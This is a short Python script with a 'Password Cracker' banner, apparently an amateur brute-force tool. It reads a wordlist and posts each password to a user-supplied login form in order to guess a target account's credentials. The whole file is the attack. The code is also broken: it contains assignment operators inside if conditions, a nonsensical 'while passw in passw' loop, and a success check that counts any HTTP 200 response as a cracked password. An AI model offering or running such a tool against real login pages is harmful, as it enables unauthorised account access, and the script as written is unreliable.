import requests 
import time 
import sys 
import os 


print('''
    __________                                               .___ _________                       __                 
    \______   \_____    ______ ________  _  _____________  __| _/ \_   ___ \____________    ____ |  | __ ___________ 
     |     ___/\__  \  /  ___//  ___/\ \/ \/ /  _ \_  __ \/ __ |  /    \  \/\_  __ \__  \ _/ ___\|  |/ // __ \_  __ \
     |    |     / __ \_\___ \ \___ \  \     (  <_> )  | \/ /_/ |  \     \____|  | \// __ \\  \___|    <\  ___/|  | \/
     |____|    (____  /____  >____  >  \/\_/ \____/|__|  \____ |   \______  /|__|  (____  /\___  >__|_ \\___  >__|   
                    \/     \/     \/                          \/          \/            \/     \/     \/    \/       

- By 0xHawwk
''')


# User Inputs 
url = input("What is the web-address of the login form: ")
uname = input("What is the username: ")
uname_field = input("What is the name of username field: ")
pass_field = input("What is the name of password field: ")
wordlist = input("What is the location of the wordlist: ")

# Default fields 
if uname_field = "":
    uname_field = "username"

if pass_field = "":
     pass_field = "password"


# Opening wordlist
passw = open(str(wordlist),"r")

# Trying password combination
while passw in passw:
    
    # Form payloads 
    payload = {

        uname_field: uname,
        pass_field: passw
    }

    # Post login form (HTML)
    r = requests.post(url, data=payload)
    if r.status_code == 200:
        print(str(uname)+":"+str(passw)+" was successful!")
 